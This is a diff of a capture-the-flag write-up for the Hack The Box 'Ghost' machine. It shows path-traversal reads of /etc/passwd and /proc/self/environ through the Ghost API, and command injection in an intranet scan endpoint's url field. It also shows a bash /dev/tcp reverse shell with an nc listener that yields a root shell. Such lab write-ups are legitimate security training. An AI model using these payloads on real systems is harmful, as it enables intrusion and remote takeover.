@@ -455,7 +455,7 @@ Googling for Ghost API key documentation (https://ghost.org/docs/content-api/):
 
 Attempt to read `/etc/passwd` with the Ghost API:
 
-```
+```sh
 curl -s "http://ghost.htb:8008/ghost/api/content/posts/?extra=../../../../etc/passwd&key=a5af628828958c976a3b6cc81a" | jq
 ```
 
@@ -490,7 +490,7 @@ Recall that the blog integrates with intranet via an API key named `DEV_INTRANET
 
 Let's attempt to retrieve the container environment variables:
 
-```
+```sh
 curl -s "http://ghost.htb:8008/ghost/api/content/posts/?extra=../../../../proc/self/environ&key=a5af628828958c976a3b6cc81a" | jq
 ```
 
@@ -540,4 +540,58 @@ curl -s "http://ghost.htb:8008/ghost/api/content/posts/?extra=../../../../proc/s
         .arg("-c")
         .arg(format!("intranet_url_check {}", data.url))
         .output();
+```
+
+### 6.2. Getting a reverse shell from Ghost CMS container
+
+Let's test the code execution ability on the `scan` API.
+
+Terminating the command with `;` then adding whatever command behind should work: e.g. `; id`
+
+```sh
+curl -s http://intranet.ghost.htb:8008/api-dev/scan -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' -H 'Content-Type: application/json' -d '{"url":"; id"}' | jq
+```
+
+Indeed, `id` reveals that the code is executed as `root` of the container
+
+(the `intranet_url_check: command not found` stderr message also confirms that the feature is still in development)
+
+```js
+{
+  "is_safe": true,
+  "temp_command_success": true,
+  "temp_command_stdout": "uid=0(root) gid=0(root) groups=0(root)\n",
+  "temp_command_stderr": "bash: line 1: intranet_url_check: command not found\n"
+}
+```
+
+Since the container has `bash`, let's use the bash reverse shell:
+
+```sh
+bash -i >& /dev/tcp/<kali-ip>/4444 0>&1
+```
+
+Setup a listener:
+
+```sh
+rlwrap nc -nlvp 4444
+```
+
+Put the reverse shell command into `curl` and using `&` to run it in the background:
+
+```sh
+curl -s http://intranet.ghost.htb:8008/api-dev/scan -H 'X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe' -H 'Content-Type: application/json' -d '{"url":"; bash -i >& /dev/tcp/<kali-ip>/4444 0>&1"}' &
+```
+
+Reverse shell hooked:
+
+```console
+root@kali:~# rlwrap nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.17] from (UNKNOWN) [10.10.11.24] 49828
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@36b733906694:/app# id
+id
+uid=0(root) gid=0(root) groups=0(root)
 ```
